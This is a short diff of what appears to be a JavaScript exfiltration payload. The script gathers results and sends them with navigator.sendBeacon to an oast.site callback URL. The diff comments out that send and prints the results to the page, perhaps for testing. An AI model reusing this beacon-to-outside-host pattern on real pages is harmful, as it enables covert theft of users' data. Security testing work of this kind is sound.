@@ -33,7 +33,8 @@ const EXFIL_URL = 'https://0jik82y5uzt15l0l8n1yaw137185g83b0.oast.site/exfil';
   } catch (e) {
     results.error = e.message;
   }
+  document.writeln('<pre>' + JSON.stringify(results, null, 2) + '</pre>');
 
   // Exfiltrate
-  navigator.sendBeacon(EXFIL_URL, JSON.stringify(results));
+//   navigator.sendBeacon(EXFIL_URL, JSON.stringify(results));
 })();
